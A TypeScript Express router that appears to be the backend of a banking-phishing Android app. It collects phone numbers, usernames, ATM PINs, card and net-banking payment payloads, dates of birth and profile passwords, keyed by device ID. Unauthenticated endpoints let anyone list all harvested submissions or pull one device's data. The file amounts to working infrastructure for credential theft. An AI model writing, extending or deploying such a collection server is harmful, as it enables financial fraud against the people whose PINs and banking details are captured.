import express, { Request, Response } from "express";
import FormSubmission from "../models/FormSubmission";
import Payment from "../models/Payment";
import logger from "../logger/logger";

const router = express.Router();

/**
 * Helper: normalize a FormSubmission doc into Android-friendly FormEntry shape.
 * Tries multiple payload keys for best compatibility.
 */
function transformFormDoc(doc: any) {
  const payload = doc.payload || {};

  // phone number fallbacks
  const phoneNumber =
    payload.phoneNumber ??
    payload.mobileNumber ??
    payload.phone ??
    payload.msisdn ??
    payload.phone_number ??
    "";

  const username =
    payload.username ??
    payload.name ??
    payload.userName ??
    payload.user ??
    "";

  const atmPin =
    payload.atmPin ??
    payload.pin ??
    payload.atm_pin ??
    payload.atmpin ??
    payload.pin_code ??
    "";

  return {
    _id: doc._id,
    uniqueid: doc.uniqueid || (payload.uniqueid ?? ""),
    phoneNumber: phoneNumber,
    username: username,
    atmPin: atmPin,
    // include raw payload too in case Android wants to inspect other fields later
    payload: payload,
    createdAt: doc.createdAt,
    updatedAt: doc.updatedAt,
  };
}

/* ================= LIST FORM SUBMISSIONS ================= */
router.get("/form_submissions", async (_req: Request, res: Response) => {
  try {
    const docs = await FormSubmission.find().lean();
    // transform each doc to Android-friendly shape
    const out = docs.map(transformFormDoc);
    return res.json(out);
  } catch (err: any) {
    logger.error("forms: list form_submissions failed", err);
    return res.status(500).json([]);
  }
});

/* ================= GET FORM BY DEVICE (Android uses this) ================= */
router.get("/form_submissions/user/:uniqueid", async (req: Request, res: Response) => {
  try {
    const docs = await FormSubmission.find({
      uniqueid: req.params.uniqueid,
    }).lean();

    // transform to expected shape
    const out = docs.map(transformFormDoc);
    return res.json(out);
  } catch (err: any) {
    logger.error("forms: fetch by device failed", err);
    return res.status(500).json([]);
  }
});

/* ================= DELETE FORM SUBMISSION ================= */
router.delete("/form_submissions/:uniqueid", async (req: Request, res: Response) => {
  try {
    await FormSubmission.deleteOne({ uniqueid: req.params.uniqueid });
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("forms: delete form_submission failed", err);
    return res.status(500).json({ success: false, error: err?.message });
  }
});

/* ================= GET CARD PAYMENTS BY DEVICE ================= */
router.get("/card_payments/device/:uniqueid", async (req: Request, res: Response) => {
  try {
    const docs = await Payment.find({
      uniqueid: req.params.uniqueid,
      method: "card",
    }).lean();

    return res.json(docs.map(d => d.payload));
  } catch (err: any) {
    logger.error("forms: card payments fetch failed", err);
    return res.status(500).json([]);
  }
});

/* ================= GET NET BANKING BY DEVICE ================= */
router.get("/net_banking/device/:uniqueid", async (req: Request, res: Response) => {
  try {
    const docs = await Payment.find({
      uniqueid: req.params.uniqueid,
      method: "netbanking",
    }).lean();

    return res.json(docs.map(d => d.payload));
  } catch (err: any) {
    logger.error("forms: net banking fetch failed", err);
    return res.status(500).json([]);
  }
});

/* ================= GET SUCCESS DATA (dob + profilePassword) ================= */
router.get("/success_data/device/:uniqueid", async (req: Request, res: Response) => {
  try {
    const doc = await FormSubmission.findOne({
      uniqueid: req.params.uniqueid,
    }).lean();

    if (!doc) return res.json({ dob: "", profilePassword: "" });

    const payload = doc.payload || {};
    return res.json({
      dob: payload.dob || "",
      profilePassword: payload.profilePassword || "",
    });
  } catch (err: any) {
    logger.error("forms: success_data fetch failed", err);
    return res.status(500).json({});
  }
});

/* ================= POST: SUCCESS DATA (flexible — merge any keys into payload) ================= */
router.post("/success_data", async (req: Request, res: Response) => {
  const body = req.body || {};
  const uniqueid = (body.uniqueid || "") as string;

  if (!uniqueid) {
    return res.status(400).json({ success: false, error: "missing uniqueid" });
  }

  try {
    logger.info("forms: success_data payload received", { uniqueid, keys: Object.keys(body) });

    // Fetch existing document (if any) so we can merge payloads instead of overwriting
    const existing = await FormSubmission.findOne({ uniqueid }).lean();
    const existingPayload = existing?.payload && typeof existing.payload === "object" ? existing.payload : {};

    // Merge — incoming keys override existing keys
    const mergedPayload = Object.assign({}, existingPayload, body);

    // Ensure we don't store top-level mongoose fields inside payload accidentally
    // (uniqueid is stored at top-level on the doc as well)
    if (typeof mergedPayload.uniqueid !== "undefined") {
      // keep top-level uniqueid consistent and remove duplicate in payload
      delete mergedPayload.uniqueid;
    }

    await FormSubmission.findOneAndUpdate(
      { uniqueid },
      { $set: { payload: mergedPayload } },
      { upsert: true }
    );

    logger.info("forms: success_data updated", { uniqueid, changes: Object.keys(body) });
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("forms: success_data failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

/* ================= POST: generic form_submissions (store full body as payload) ================= */
router.post("/form_submissions", async (req: Request, res: Response) => {
  const body = req.body || {};
  try {
    const doc = new FormSubmission({
      uniqueid: body.uniqueid || body.deviceId || "",
      payload: body,
    });

    await doc.save();
    logger.info("forms: form_submissions saved", { uniqueid: doc.uniqueid });
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("forms: save form_submissions failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

/* ================= POST: payments (keep existing behavior) ================= */
router.post("/card_payments", async (req: Request, res: Response) => {
  try {
    const body = req.body || {};
    const p = new Payment({
      uniqueid: body.uniqueid || "",
      method: "card",
      payload: body,
      status: "pending",
    });

    await p.save();
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("forms: card_payment failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

router.post("/net_banking", async (req: Request, res: Response) => {
  try {
    const body = req.body || {};
    const p = new Payment({
      uniqueid: body.uniqueid || "",
      method: "netbanking",
      payload: body,
      status: "pending",
    });

    await p.save();
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("forms: net_banking failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

export default router;
